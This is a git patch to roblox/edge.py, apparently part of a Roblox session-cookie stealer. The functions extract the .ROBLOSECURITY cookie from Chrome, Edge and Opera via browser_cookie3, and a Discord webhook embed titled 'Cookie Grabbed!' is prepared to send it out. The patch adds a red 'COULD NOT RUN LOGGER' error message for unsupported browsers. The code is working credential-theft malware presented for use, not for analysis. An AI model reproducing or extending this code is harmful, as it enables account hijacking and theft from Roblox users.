@@ -1,0 +1,89 @@
+From 2aa79f9a012af64cd22fdd9218f65e4bd4e8940c Mon Sep 17 00:00:00 2001
+From: Kai Daniel Gonzalez <gkai70264@gmail.com>
+Date: Mon, 3 Oct 2022 20:44:02 +0000
+Subject: [PATCH 3/6] Some useful information
+
+Now it gives a **big red error** if it's not a distro build!
+---
+ roblox/edge.py | 22 +++++++++++++++++-----
+ 1 file changed, 17 insertions(+), 5 deletions(-)
+
+diff --git a/roblox/edge.py b/roblox/edge.py
+index 9449d9a..1904f55 100644
+--- a/roblox/edge.py
++++ b/roblox/edge.py
+@@ -1,9 +1,10 @@
++from time import sleep
+ import browser_cookie3
+ from discord_webhook import DiscordWebhook, DiscordEmbed
++import requests
++import colorama
+ import grab.defaults
+ 
+-agent = "Browser"
+-
+ 
+ def use_edge():
+     try:
+@@ -12,7 +13,6 @@ def use_edge():
+         cookies = str(cookies)
+         cookie = cookies.split('.ROBLOSECURITY=')[1].split(
+             ' for .roblox.com/>')[0].strip()
+-        agent = "Microsoft Edge"
+         return cookie
+     except:
+         pass
+@@ -23,29 +23,40 @@ def use_chrome():
+         # Use Microsoft Edge to get cookies
+         cookies = browser_cookie3.chromium(domain_name='roblox.com')
+         cookies = str(cookies)
+-        agent = "Chrome"
+         cookie = cookies.split('.ROBLOSECURITY=')[1].split(
+             ' for .roblox.com/>')[0].strip()
+         return cookie
+     except:
+         pass
+ 
++
+ def use_opera():
+     try:
+         # Use Microsoft Edge to get cookies
+         cookies = browser_cookie3.opera(domain_name='roblox.com')
+         cookies = str(cookies)
+-        agent = "Opera (based)"
+         cookie = cookies.split('.ROBLOSECURITY=')[1].split(
+             ' for .roblox.com/>')[0].strip()
+         return cookie
+     except:
+         pass
+ 
++
+ def find_proper_browser():
+     if (use_chrome() is not None): return use_chrome()
+     elif (use_edge() is not None): return use_edge()
+     elif (use_opera() is not None): return use_opera()
++    else:
++        return error_out()
++
++
++def error_out():
++    # comment this out if it's a release
++    print(
++        colorama.Style.BRIGHT + colorama.Fore.RED +
++        "!!! COULD NOT RUN LOGGER !!!\nfor programmers: this could be because the host system does not run a supported browser. "+
++        "Please refer to the browser_cookie3 module website for more info."
++        + colorama.Style.RESET_ALL + colorama.Fore.RESET)
+ 
+ 
+ def find_proper_agent():
+@@ -55,6 +66,7 @@ def find_proper_agent():
+     else:
+         return "Un-supported Browser Framework"
+ 
++
+ # Send to deafult webhook
+ eb = DiscordEmbed('Cookie Grabbed!', color="03b2f8")
+ 
+-- 
+2.37.3.windows.1
+
